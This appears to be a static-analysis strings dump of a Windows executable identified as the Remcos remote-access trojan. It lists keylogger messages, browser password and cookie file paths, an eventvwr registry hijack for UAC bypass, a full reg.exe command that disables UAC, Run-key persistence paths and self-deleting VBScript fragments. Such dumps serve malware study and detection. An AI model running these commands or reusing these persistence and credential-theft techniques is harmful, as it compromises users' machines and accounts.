Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0x52c00 0x00401000  0x53000 -r-x .text
1   0x00053000  0x17000 0x00454000  0x17000 -r-- .rdata
2   0x0006a000    0xe00 0x0046b000   0x4000 -rw- .data
3   0x0006ae00    0x200 0x0046f000   0x1000 -rw- .tls
4   0x0006b000    0x400 0x00470000   0x1000 -r-- .gfids
5   0x0006b400   0x4c00 0x00471000   0x5000 -r-- .rsrc
6   0x00070000   0x3a00 0x00476000   0x4000 -r-- .reloc

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00430f6e paddr=0x0003036e haddr=0x00000140 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Main]
vaddr=0x0040c3c6 paddr=0x0000b7c6
[Imports]
nth vaddr      bind type lib          name
963  0x0005dde4 0x0045ede4 4   5    .rdata  ascii   \e@\t?
964  0x0005de14 0x0045ee14 4   5    .rdata  ascii    `\v?
965  0x0005de23 0x0045ee23 5   6    .rdata  ascii   r" \f?
966  0x0005de7a 0x0045ee7a 5   7    .rdata  utf8    4±cC= blocks=Basic Latin,Latin-1 Supplement
967  0x0005de8c 0x0045ee8c 4   5    .rdata  ascii   n{;=
968  0x0005decc 0x0045eecc 4   5    .rdata  ascii   3<L=
969  0x0005deda 0x0045eeda 5   7    .rdata  utf8    rF҈K= blocks=Basic Latin,Cyrillic
970  0x0005df37 0x0045ef37 6   7    .rdata  ascii   ?|I7Z#
971  0x0005df4c 0x0045ef4c 4   5    .rdata  ascii   aDJ=
972  0x0005df5a 0x0045ef5a 6   7    .rdata  ascii   >,'1D=
973  0x0005df6c 0x0045ef6c 4   5    .rdata  ascii   +NB=
974  0x0005dfc7 0x0045efc7 9   10   .rdata  ascii   ?g)([|X>=
975  0x0005e017 0x0045f017 4   5    .rdata  ascii   ?|[{
976  0x0005e01c 0x0045f01c 4   5    .rdata  ascii   ~*L=
977  0x0005e04c 0x0045f04c 4   5    .rdata  ascii   u!K=
978  0x0005e073 0x0045f073 5   6    .rdata  ascii   fAp\e?
979  0x0005e0c7 0x0045f0c7 5   6    .rdata  ascii   ?IT$7
980  0x0005e0e7 0x0045f0e7 4   6    .rdata  utf8    ?0tЗ blocks=Basic Latin,Cyrillic
981  0x0005e154 0x0045f154 4   5    .rdata  ascii   -8 ?
982  0x0005e164 0x0045f164 4   5    .rdata  ascii   .h ?
983  0x0005e1a4 0x0045f1a4 4   5    .rdata  ascii   2 !?
984  0x0005e1b3 0x0045f1b3 5   6    .rdata  ascii   \f4P!?
985  0x0005e1f3 0x0045f1f3 5   6    .rdata  ascii   u8\b"?
986  0x0005e1fa 0x0045f1fa 4   5    .rdata  ascii   !y##
987  0x0005e204 0x0045f204 4   5    .rdata  ascii   98"?
988  0x0005e214 0x0045f214 6   7    .rdata  ascii   :h"?bC
989  0x0005e254 0x0045f254 4   5    .rdata  ascii   ? #?
990  0x0005e264 0x0045f264 6   7    .rdata  ascii   @H#?43
991  0x0005e274 0x0045f274 8   9    .rdata  ascii   Ax#?uN}*
992  0x0005e28a 0x0045f28a 6   7    .rdata  ascii   r7Yr7=
993  0x0005e29b 0x0045f29b 5   6    .rdata  ascii   .K="=
994  0x0005e2b4 0x0045f2b4 7   8    .rdata  ascii   F0$?3=1
995  0x0005e2c4 0x0045f2c4 6   7    .rdata  ascii   H`$?h|
996  0x0005e306 0x0045f306 4   5    .rdata  ascii   %?uY
997  0x0005e314 0x0045f314 4   5    .rdata  ascii   NH%?
998  0x0005e324 0x0045f324 4   5    .rdata  ascii   Px%?
999  0x0005e336 0x0045f336 5   6    .rdata  ascii   %?\9\f
1000 0x0005e356 0x0045f356 6   7    .rdata  ascii   &?~YK|
1001 0x0005e363 0x0045f363 7   9    .rdata  utf8    sU0&?WĻ blocks=Basic Latin,Latin Extended-A
1002 0x0005e374 0x0045f374 4   5    .rdata  ascii   VX&?
1003 0x0005e468 0x0045f468 4   5    .rdata  ascii   4g%6
1004 0x0005e4fa 0x0045f4fa 5   6    .rdata  ascii   :]=O>
1005 0x0005e508 0x0045f508 6   8    .rdata  utf8    #w_jُB blocks=Basic Latin,Arabic
1006 0x0005e51b 0x0045f51b 4   5    .rdata  ascii   (+E 
1007 0x0005e52a 0x0045f52a 4   5    .rdata  ascii   V~|_
1008 0x0005e67a 0x0045f67a 4   6    .rdata  utf8    3Rʏ3 blocks=Basic Latin,IPA Extensions
1009 0x0005e688 0x0045f688 4   5    .rdata  ascii   !|.4
1010 0x0005e6a8 0x0045f6a8 7   8    .rdata  ascii   G"jm\n>;
1011 0x0005e728 0x0045f728 4   6    .rdata  utf8    \bT3ʢ blocks=Basic Latin,IPA Extensions
1012 0x0005e79b 0x0045f79b 4   5    .rdata  ascii   /h\f7
1013 0x0005e8e8 0x0045f8e8 4   5    .rdata  ascii   6(`J
1014 0x0005e938 0x0045f938 6   8    .rdata  utf8    Mϲk:UG blocks=Basic Latin,Greek and Coptic
1015 0x0005ea58 0x0045fa58 6   8    .rdata  utf8    ~ܾUY = blocks=Basic Latin,Syriac
1016 0x0005eadb 0x0045fadb 4   5    .rdata  ascii   Bfe9
1017 0x0005eb1b 0x0045fb1b 4   5    .rdata  ascii   E=|\n
1018 0x0005eb6a 0x0045fb6a 5   6    .rdata  ascii   CqTR;
1019 0x0005ebd8 0x0045fbd8 7   9    .rdata  utf8    \aAiFC.ֿ blocks=Basic Latin,Hebrew
1020 0x0005ec07 0x0045fc07 5   6    .rdata  ascii   ?]\b[S
1021 0x0005ec57 0x0045fc57 4   5    .rdata  ascii   ?5a1
1022 0x0005ec8d 0x0045fc8d 4   5    .rdata  ascii   :@<\e
1023 0x0005ecb1 0x0045fcb1 4   6    .rdata  utf8    1l=*
1024 0x0005ecdf 0x0045fcdf 5   6    .rdata  ascii   <{Q}<
1025 0x0005ed09 0x0045fd09 5   6    .rdata  ascii   hI{L[
1026 0x0005ed5f 0x0045fd5f 7   8    .rdata  ascii   <8bunz8
1027 0x0005ed97 0x0045fd97 4   5    .rdata  ascii   ?}\r?
1028 0x0005edcf 0x0045fdcf 4   5    .rdata  ascii   <V/>
1029 0x0005ee17 0x0045fe17 5   6    .rdata  ascii   ?(FN\
1030 0x0005eea2 0x0045fea2 4   5    .rdata  ascii   a`\bN
1031 0x0005eedc 0x0045fedc 6   8    .rdata  utf8    b˙<'*6 blocks=Basic Latin,Spacing Modifier Letters
1032 0x0005eee9 0x0045fee9 6   9    .rdata  utf8    B쯗C}<\r blocks=Basic Latin,Hangul Syllables
1033 0x0005eef7 0x0045fef7 4   5    .rdata  ascii   ?3xj
1034 0x0005ef5b 0x0045ff5b 6   9    .rdata  utf8    [ᕂ<)TH blocks=Basic Latin,Unified Canadian Aboriginal Syllabics
1035 0x0005ef7c 0x0045ff7c 6   7    .rdata  ascii   \eK<<H!
1036 0x0005f049 0x00460049 5   6    .rdata  ascii   m1WY$
1037 0x0005f0df 0x004600df 4   6    .rdata  utf8    <۠*B blocks=Basic Latin,Arabic
1038 0x0005f117 0x00460117 7   9    .rdata  utf8    ?#%X.y֝ blocks=Basic Latin,Hebrew
1039 0x0005f147 0x00460147 5   7    .rdata  utf8    ?Ѕ\e|[ blocks=Basic Latin,Cyrillic
1040 0x0005f16c 0x0046016c 6   7    .rdata  ascii   F||<##
1041 0x0005f17d 0x0046017d 4   5    .rdata  ascii   $x<e
1042 0x0005f182 0x00460182 4   5    .rdata  ascii   ]{f\f
1043 0x0005f19f 0x0046019f 4   5    .rdata  ascii   <]%>
1044 0x0005f207 0x00460207 5   7    .rdata  utf8    ?\aׄ0^ blocks=Basic Latin,Hebrew
1045 0x0005f22a 0x0046022a 5   6    .rdata  ascii   T~OXu
1046 0x0005f237 0x00460237 4   5    .rdata  ascii   ?.)T
1047 0x0005f2c2 0x004602c2 4   5    .rdata  ascii   \aJ-\a
1048 0x0005f2c9 0x004602c9 4   5    .rdata  ascii   zyC7
1049 0x0005f31b 0x0046031b 5   7    .rdata  utf8    xWڒ<_ blocks=Basic Latin,Arabic
1050 0x0005f35c 0x0046035c 4   7    .rdata  utf8    "Ւ<ڐ blocks=Basic Latin,Armenian,Arabic
1051 0x0005f392 0x00460392 4   5    .rdata  ascii   k7+%
1052 0x0005f39f 0x0046039f 7   8    .rdata  ascii   <@En[vP
1053 0x0005f3e0 0x004603e0 7   16   .rdata  utf16le CONOUT$
1054 0x0005f3f0 0x004603f0 5   6    .rdata  ascii   log10
1055 0x0005f544 0x00460544 4   5    .rdata  ascii   lzZ?
1056 0x0005f57c 0x0046057c 4   5    .rdata  ascii   \tk8=
1057 0x0005f5ab 0x004605ab 5   6    .rdata  ascii   \tQ*\e=
1058 0x0005f5bc 0x004605bc 4   5    .rdata  ascii   b6\b=
1059 0x0005f653 0x00460653 4   6    .rdata  utf8    N\vָ? blocks=Basic Latin,Hebrew
1060 0x0005f667 0x00460667 6   7    .rdata  ascii   ?5Wg4p
1061 0x0005f679 0x00460679 4   5    .rdata  ascii   Nv$^
1062 0x0005f6b1 0x004606b1 4   6    .rdata  utf8     <śm blocks=Basic Latin,Latin Extended-A
1063 0x0005f6e9 0x004606e9 4   5    .rdata  ascii   w(@\t
1064 0x0005f72b 0x0046072b 5   6    .rdata  ascii   BC .=
1065 0x0005f749 0x00460749 4   5    .rdata  ascii   a>-\e
1066 0x0005f762 0x00460762 4   5    .rdata  ascii   (lX 
1067 0x0005f82c 0x0046082c 4   5    .rdata  ascii   #{ =
1068 0x0005f831 0x00460831 4   5    .rdata  ascii   `~R=
1069 0x0005f86c 0x0046086c 4   5    .rdata  ascii   }s"=
1070 0x0005f872 0x00460872 4   5    .rdata  ascii   \tE[\n
1071 0x0005f879 0x00460879 5   6    .rdata  ascii   %S#[k
1072 0x0005f8c1 0x004608c1 4   6    .rdata  utf8    x¾/@ blocks=Basic Latin,Latin-1 Supplement
1073 0x0005f8ca 0x004608ca 6   7    .rdata  ascii   "B <1=
1074 0x0005f8d9 0x004608d9 4   5    .rdata  ascii   \-!y
1075 0x0005f8fa 0x004608fa 6   7    .rdata  ascii   \f#.X'=
1076 0x0005f92c 0x0046092c 4   5    .rdata  ascii   i9+=
1077 0x0005fd6f 0x00460d6f 5   6    .rdata  ascii   ?RIFF
1078 0x0005fd78 0x00460d78 4   5    .rdata  ascii   WAVE
1079 0x0005fd80 0x00460d80 4   5    .rdata  ascii   fmt 
1080 0x0005fd88 0x00460d88 4   5    .rdata  ascii   data
1081 0x0005fd90 0x00460d90 14  15   .rdata  ascii   %Y-%m-%d %H.%M
1082 0x0005fda0 0x00460da0 4   10   .rdata  utf16le .wav
1083 0x0005fdac 0x00460dac 27  28   .rdata  ascii   invalid vector<T> subscript
1084 0x0005fdc8 0x00460dc8 18  19   .rdata  ascii   vector<T> too long
1085 0x0005fddc 0x00460ddc 15  16   .rdata  ascii   string too long
1086 0x0005fdec 0x00460dec 23  24   .rdata  ascii   invalid string position
1087 0x0005fe0c 0x00460e0c 26  54   .rdata  utf16le sort "Visit Time" /stext "
1088 0x0005fe44 0x00460e44 10  11   .rdata  ascii   OpenCamera
1089 0x0005fe50 0x00460e50 11  12   .rdata  ascii   CloseCamera
1090 0x0005fe5c 0x00460e5c 8   9    .rdata  ascii   GetFrame
1091 0x0005fe68 0x00460e68 9   10   .rdata  ascii   FreeFrame
1092 0x0005fe7c 0x00460e7c 24  25   .rdata  ascii   Failed to initialize TLS
1093 0x0005fe9c 0x00460e9c 32  33   .rdata  ascii   Failed to initialize TLS context
1094 0x0005fec0 0x00460ec0 30  31   .rdata  ascii   Failed to load TLS certificate
1095 0x0005fee0 0x00460ee0 22  23   .rdata  ascii   Failed to load TLS key
1096 0x0005fef8 0x00460ef8 31  32   .rdata  ascii   Failed to load peer certificate
1097 0x0005ff18 0x00460f18 22  23   .rdata  ascii   TLS_AES_128_GCM_SHA256
1098 0x0005ff30 0x00460f30 25  26   .rdata  ascii   Failed to set cipher list
1099 0x0005ff4c 0x00460f4c 24  25   .rdata  ascii   TLS Handshake...      | 
1100 0x0005ff6c 0x00460f6c 11  12   .rdata  ascii   TLS Error 1
1101 0x0005ff78 0x00460f78 11  12   .rdata  ascii   TLS Error 2
1102 0x0005ff84 0x00460f84 25  26   .rdata  ascii   TLS Authentication Failed
1103 0x0005ffa0 0x00460fa0 11  12   .rdata  ascii   TLS Error 3
1104 0x0005ffac 0x00460fac 18  19   .rdata  ascii   Connection Refused
1105 0x0005ffc0 0x00460fc0 19  20   .rdata  ascii   Connection Failed: 
1106 0x0005ffd4 0x00460fd4 43  44   .rdata  ascii   Connection KeepAlive  | Enabled | Timeout: 
1107 0x00060000 0x00461000 31  32   .rdata  ascii   Connection KeepAlive | Disabled
1108 0x00060024 0x00461024 18  19   .rdata  ascii   Connection Timeout
1109 0x00060038 0x00461038 14  15   .rdata  ascii   DisplayMessage
1110 0x00060048 0x00461048 10  11   .rdata  ascii   GetMessage
1111 0x00060054 0x00461054 9   10   .rdata  ascii   CloseChat
1112 0x00060068 0x00461068 7   8    .rdata  ascii   cmd.exe
1113 0x00060070 0x00461070 11  12   .rdata  ascii   SystemDrive
1114 0x0006007c 0x0046107c 4   20   .rdata  utf32le \\nF2
1115 0x00060098 0x00461098 4   20   .rdata  utf32le 310M
1116 0x000600ac 0x004610ac 22  23   .rdata  ascii   ile\shell\open\command
1117 0x000600c4 0x004610c4 7   8    .rdata  ascii   origmsc
1118 0x000600d0 0x004610d0 43  88   .rdata  utf16le Software\Classes\mscfile\shell\open\command
1119 0x00060128 0x00461128 12  13   .rdata  ascii   eventvwr.exe
1120 0x00060138 0x00461138 43  44   .rdata  ascii   Software\Classes\mscfile\shell\open\command
1121 0x00060164 0x00461164 18  19   .rdata  ascii   CurrentBuildNumber
1122 0x00060178 0x00461178 44  45   .rdata  ascii   SOFTWARE\Microsoft\Windows NT\CurrentVersion
1123 0x000601bc 0x004611bc 20  21   .rdata  ascii   Browsing directory: 
1124 0x000601d4 0x004611d4 16  17   .rdata  ascii   Executing file: 
1125 0x000601e8 0x004611e8 18  19   .rdata  ascii   Downloading file: 
1126 0x000601fc 0x004611fc 17  18   .rdata  ascii   Downloaded file: 
1127 0x00060210 0x00461210 25  26   .rdata  ascii   Failed to download file: 
1128 0x0006022c 0x0046122c 14  15   .rdata  ascii   Deleted file: 
1129 0x0006023c 0x0046123c 18  19   .rdata  ascii   Unable to delete: 
1130 0x00060258 0x00461258 22  23   .rdata  ascii   Unable to rename file!
1131 0x0006027c 0x0046127c 15  16   .rdata  ascii   Uploaded file: 
1132 0x0006028c 0x0046128c 23  24   .rdata  ascii   Failed to upload file: 
1133 0x000602a4 0x004612a4 30  31   .rdata  ascii   Uploading file to Controller: 
1134 0x000602c4 0x004612c4 22  23   .rdata  ascii   SetFilePointerEx error
1135 0x000602dc 0x004612dc 14  15   .rdata  ascii   ReadFile error
1136 0x000602ec 0x004612ec 25  26   .rdata  ascii   Offline Keylogger Started
1137 0x00060308 0x00461308 40  41   .rdata  ascii   Keylogger initialization failure: error 
1138 0x00060334 0x00461334 4   10   .rdata  utf16le  ]\r\n
1139 0x00060340 0x00461340 4   10   .rdata  utf16le \r\n[ 
1140 0x0006035c 0x0046135c 12  13   .rdata  ascii    minutes }\r\n
1141 0x0006036c 0x0046136c 27  28   .rdata  ascii   \r\n{ User has been idle for 
1142 0x00060388 0x00461388 24  25   .rdata  ascii   Online Keylogger Started
1143 0x000603a4 0x004613a4 24  25   .rdata  ascii   Online Keylogger Stopped
1144 0x000603c0 0x004613c0 25  26   .rdata  ascii   Offline Keylogger Stopped
1145 0x000603e0 0x004613e0 33  68   .rdata  utf16le \r\n[%04i/%02i/%02i %02i:%02i:%02i 
1146 0x00060424 0x00461424 7   8    .rdata  ascii   [Space]
1147 0x0006042c 0x0046142c 7   8    .rdata  ascii   [BckSp]
1148 0x00060434 0x00461434 5   6    .rdata  ascii   [Tab]
1149 0x0006043c 0x0046143c 9   10   .rdata  ascii   [Enter]\r\n
1150 0x00060448 0x00461448 5   6    .rdata  ascii   [Alt]
1151 0x00060450 0x00461450 7   8    .rdata  ascii   [Pause]
1152 0x00060458 0x00461458 5   6    .rdata  ascii   [Esc]
1153 0x00060460 0x00461460 7   8    .rdata  ascii   [PagUp]
1154 0x00060468 0x00461468 7   8    .rdata  ascii   [PagDw]
1155 0x00060470 0x00461470 5   6    .rdata  ascii   [End]
1156 0x00060478 0x00461478 7   8    .rdata  ascii   [Start]
1157 0x00060480 0x00461480 6   7    .rdata  ascii   [Left]
1158 0x00060488 0x00461488 4   5    .rdata  ascii   [Up]
1159 0x00060490 0x00461490 7   8    .rdata  ascii   [Right]
1160 0x00060498 0x00461498 6   7    .rdata  ascii   [Down]
1161 0x000604a0 0x004614a0 7   8    .rdata  ascii   [Print]
1162 0x000604a8 0x004614a8 5   6    .rdata  ascii   [Ins]
1163 0x000604b0 0x004614b0 5   6    .rdata  ascii   [Del]
1164 0x000604b8 0x004614b8 5   6    .rdata  ascii   [Win]
1165 0x000604c0 0x004614c0 6   7    .rdata  ascii   [Menu]
1166 0x000604c8 0x004614c8 4   5    .rdata  ascii   [F1]
1167 0x000604d0 0x004614d0 4   5    .rdata  ascii   [F2]
1168 0x000604d8 0x004614d8 4   5    .rdata  ascii   [F3]
1169 0x000604e0 0x004614e0 4   5    .rdata  ascii   [F4]
1170 0x000604e8 0x004614e8 4   5    .rdata  ascii   [F5]
1171 0x000604f0 0x004614f0 4   5    .rdata  ascii   [F6]
1172 0x000604f8 0x004614f8 4   5    .rdata  ascii   [F7]
1173 0x00060500 0x00461500 4   5    .rdata  ascii   [F8]
1174 0x00060508 0x00461508 4   5    .rdata  ascii   [F9]
1175 0x00060510 0x00461510 5   6    .rdata  ascii   [F10]
1176 0x00060518 0x00461518 5   6    .rdata  ascii   [F11]
1177 0x00060520 0x00461520 5   6    .rdata  ascii   [F12]
1178 0x00060528 0x00461528 24  25   .rdata  ascii   \r\n[End of clipboard]\r\n\r\n
1179 0x00060544 0x00461544 40  41   .rdata  ascii   [Ctrl+V]\r\n[Text pasted from clipboard]\r\n
1180 0x00060574 0x00461574 6   7    .rdata  ascii   [Ctrl+
1181 0x0006057c 0x0046157c 6   7    .rdata  ascii   [AltL]
1182 0x00060584 0x00461584 6   7    .rdata  ascii   [AltR]
1183 0x0006058c 0x0046158c 7   8    .rdata  ascii   [CtrlL]
1184 0x00060594 0x00461594 7   8    .rdata  ascii   [CtrlR]
1185 0x0006059c 0x0046159c 22  23   .rdata  ascii   \r\n[End of clipboard]\r\n
1186 0x000605b4 0x004615b4 30  31   .rdata  ascii   \r\n[Text copied to clipboard]\r\n
1187 0x000605d8 0x004615d8 57  58   .rdata  ascii   \AppData\Local\Google\Chrome\User Data\Default\Login Data
1188 0x00060614 0x00461614 11  12   .rdata  ascii   UserProfile
1189 0x00060620 0x00461620 32  33   .rdata  ascii   \n[Chrome StoredLogins not found]
1190 0x00060644 0x00461644 38  39   .rdata  ascii   \n[Chrome StoredLogins found, cleared!]
1191 0x0006066c 0x0046166c 54  55   .rdata  ascii   \AppData\Local\Google\Chrome\User Data\Default\Cookies
1192 0x000606a4 0x004616a4 27  28   .rdata  ascii   \n[Chrome Cookies not found]
1193 0x000606c0 0x004616c0 33  34   .rdata  ascii   \n[Chrome Cookies found, cleared!]
1194 0x000606e4 0x004616e4 42  43   .rdata  ascii   \AppData\Roaming\Mozilla\Firefox\Profiles\
1195 0x00060710 0x00461710 33  34   .rdata  ascii   \n[Firefox StoredLogins not found]
1196 0x0006073c 0x0046173c 12  13   .rdata  ascii   \logins.json
1197 0x0006074c 0x0046174c 8   9    .rdata  ascii   \key3.db
1198 0x00060758 0x00461758 32  33   .rdata  ascii   \n[Firefox StoredLogins Cleared!]
1199 0x0006077c 0x0046177c 28  29   .rdata  ascii   \n[Firefox Cookies not found]
1200 0x0006079c 0x0046179c 15  16   .rdata  ascii   \cookies.sqlite
1201 0x000607ac 0x004617ac 34  35   .rdata  ascii   \n[Firefox cookies found, cleared!]
1202 0x000607d0 0x004617d0 7   8    .rdata  ascii   Cookies
1203 0x000607d8 0x004617d8 69  70   .rdata  ascii   Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
1204 0x00060820 0x00461820 23  24   .rdata  ascii   \n[IE cookies not found]
1205 0x00060838 0x00461838 22  23   .rdata  ascii   \n[IE cookies cleared!]
1206 0x00060854 0x00461854 40  41   .rdata  ascii   \n[Cleared browsers logins and cookies.]\n
1207 0x00060880 0x00461880 36  37   .rdata  ascii   Cleared browsers logins and cookies.
1208 0x000608ac 0x004618ac 7   8    .rdata  ascii   FunFunc
1209 0x000608b8 0x004618b8 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
1210 0x00060918 0x00461918 64  130  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\
1211 0x0006099c 0x0046199c 12  26   .rdata  utf16le \install.vbs
1212 0x000609b8 0x004619b8 4   10   .rdata  utf16le Temp
1213 0x000609c4 0x004619c4 19  40   .rdata  utf16le WScript.Sleep 1000\n
1214 0x000609f0 0x004619f0 53  108  .rdata  utf16le Set fso = CreateObject("Scripting.FileSystemObject")\n
1215 0x00060a64 0x00461a64 13  28   .rdata  utf16le o.DeleteFile 
1216 0x00060a80 0x00461a80 6   14   .rdata  utf16le """, 0
1217 0x00060a90 0x00461a90 44  90   .rdata  utf16le CreateObject("WScript.Shell").Run "cmd /c ""
1218 0x00060af0 0x00461af0 38  78   .rdata  utf16le fso.DeleteFile(Wscript.ScriptFullName)
1219 0x00060b40 0x00461b40 7   8    .rdata  ascii   exepath
1220 0x00060b48 0x00461b48 4   10   .rdata  utf16le .vbs
1221 0x00060b54 0x00461b54 21  44   .rdata  utf16le On Error Resume Next\n
1222 0x00060b88 0x00461b88 22  46   .rdata  utf16le while fso.FileExists("
1223 0x00060bc0 0x00461bc0 16  34   .rdata  utf16le fso.DeleteFile "
1224 0x00060be4 0x00461be4 5   12   .rdata  utf16le wend\n
1225 0x00060bf0 0x00461bf0 18  38   .rdata  utf16le fso.DeleteFolder "
1226 0x00060c18 0x00461c18 11  24   .rdata  utf16le \update.vbs
1227 0x00060c30 0x00461c30 77  156  .rdata  utf16le CreateObject("Scripting.FileSystemObject").DeleteFile(Wscript.ScriptFullName)
1228 0x00060ccc 0x00461ccc 17  18   .rdata  ascii   Unknown exception
1229 0x00060ce0 0x00461ce0 8   9    .rdata  ascii   bad cast
1230 0x00060cec 0x00461cec 15  16   .rdata  ascii   bad locale name
1231 0x00060d00 0x00461d00 7   8    .rdata  ascii   generic
1232 0x00060d08 0x00461d08 8   9    .rdata  ascii   iostream
1233 0x00060d14 0x00461d14 21  22   .rdata  ascii   iostream stream error
1234 0x00060d2c 0x00461d2c 20  21   .rdata  ascii   ios_base::badbit set
1235 0x00060d44 0x00461d44 21  22   .rdata  ascii   ios_base::failbit set
1236 0x00060d5c 0x00461d5c 20  21   .rdata  ascii   ios_base::eofbit set
1237 0x00060d78 0x00461d78 16  17   .rdata  ascii   license_code.txt
1238 0x00060d8c 0x00461d8c 9   10   .rdata  ascii   Software\
1239 0x00060da4 0x00461da4 11  12   .rdata  ascii   ProductName
1240 0x00060db0 0x00461db0 9   10   .rdata  ascii    (64 bit)
1241 0x00060dbc 0x00461dbc 9   10   .rdata  ascii    (32 bit)
1242 0x00060dc8 0x00461dc8 7   8    .rdata  ascii   licence
1243 0x00060dd0 0x00461dd0 24  25   .rdata  ascii   Remcos Agent initialized
1244 0x00060dec 0x00461dec 4   5    .rdata  ascii   User
1245 0x00060df4 0x00461df4 14  15   .rdata  ascii   Access Level: 
1246 0x00060e04 0x00461e04 13  14   .rdata  ascii   Administrator
1247 0x00060e14 0x00461e14 20  21   .rdata  ascii   GetModuleFileNameExA
1248 0x00060e2c 0x00461e2c 9   10   .rdata  ascii   Psapi.dll
1249 0x00060e38 0x00461e38 12  13   .rdata  ascii   Kernel32.dll
1250 0x00060e48 0x00461e48 20  21   .rdata  ascii   GetModuleFileNameExW
1251 0x00060e60 0x00461e60 20  21   .rdata  ascii   NtUnmapViewOfSection
1252 0x00060e78 0x00461e78 9   10   .rdata  ascii   ntdll.dll
1253 0x00060e84 0x00461e84 20  21   .rdata  ascii   GlobalMemoryStatusEx
1254 0x00060e9c 0x00461e9c 12  13   .rdata  ascii   kernel32.dll
1255 0x00060eac 0x00461eac 14  15   .rdata  ascii   IsWow64Process
1256 0x00060ebc 0x00461ebc 8   9    .rdata  ascii   kernel32
1257 0x00060ec8 0x00461ec8 18  19   .rdata  ascii   GetComputerNameExW
1258 0x00060edc 0x00461edc 13  14   .rdata  ascii   IsUserAnAdmin
1259 0x00060eec 0x00461eec 7   8    .rdata  ascii   Shell32
1260 0x00060ef4 0x00461ef4 19  20   .rdata  ascii   SetProcessDEPPolicy
1261 0x00060f08 0x00461f08 19  20   .rdata  ascii   EnumDisplayDevicesW
1262 0x00060f1c 0x00461f1c 6   7    .rdata  ascii   user32
1263 0x00060f24 0x00461f24 19  20   .rdata  ascii   EnumDisplayMonitors
1264 0x00060f38 0x00461f38 15  16   .rdata  ascii   GetMonitorInfoW
1265 0x00060f48 0x00461f48 11  12   .rdata  ascii   Shlwapi.dll
1266 0x00060f5c 0x00461f5c 12  26   .rdata  utf16le ogram Files\
1267 0x00060f78 0x00461f78 20  42   .rdata  utf16le Program Files (x86)\
1268 0x00060fa4 0x00461fa4 8   9    .rdata  ascii   override
1269 0x00060fb0 0x00461fb0 9   20   .rdata  utf16le pth_unenc
1270 0x00060fc4 0x00461fc4 9   10   .rdata  ascii   3.4.0 Pro
1271 0x00060fe0 0x00461fe0 129 130  .rdata  ascii   /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
1272 0x00061064 0x00462064 27  28   .rdata  ascii   C:\Windows\System32\cmd.exe
1273 0x00061170 0x00462170 12  13   .rdata  ascii   StartForward
1274 0x00061180 0x00462180 12  13   .rdata  ascii   StartReverse
1275 0x00061190 0x00462190 11  12   .rdata  ascii   StopForward
1276 0x0006119c 0x0046219c 11  12   .rdata  ascii   StopReverse
1277 0x000611a8 0x004621a8 22  23   .rdata  ascii   GetDirectListeningPort
1278 0x00061200 0x00462200 8   9    .rdata  ascii   finished
1279 0x0006120c 0x0046220c 12  13   .rdata  ascii   s ap traffic
1280 0x0006121c 0x0046221c 12  13   .rdata  ascii   s hs traffic
1281 0x0006122c 0x0046222c 33  34   .rdata  ascii   TLS 1.3, client CertificateVerify
1282 0x00061250 0x00462250 11  12   .rdata  ascii   traffic upd
1283 0x0006125c 0x0046225c 7   8    .rdata  ascii   derived
1284 0x00061264 0x00462264 6   7    .rdata  ascii   tls13 
1285 0x0006126c 0x0046226c 12  13   .rdata  ascii   c ap traffic
1286 0x0006127c 0x0046227c 12  13   .rdata  ascii   c hs traffic
1287 0x0006128c 0x0046228c 33  34   .rdata  ascii   TLS 1.3, server CertificateVerify
1288 0x000612db 0x004622db 6   8    .rdata  utf8    QSeA~ä blocks=Basic Latin,Latin-1 Supplement
1289 0x00061301 0x00462301 4   6    .rdata  utf8    v̈%L blocks=Basic Latin,Combining Diacritical Marks
1290 0x0006130e 0x0046230e 5   7    .rdata  utf8    *ŀD5& blocks=Basic Latin,Latin Extended-A
1291 0x0006134d 0x0046234d 5   6    .rdata  ascii   !tX)i
1292 0x00061398 0x00462398 4   5    .rdata  ascii   XhHp
1293 0x000613b6 0x004623b6 4   5    .rdata  ascii   Uf\a(
1294 0x000613f7 0x004623f7 4   6    .rdata  utf8    ĝS.4 blocks=Latin Extended-A,Basic Latin
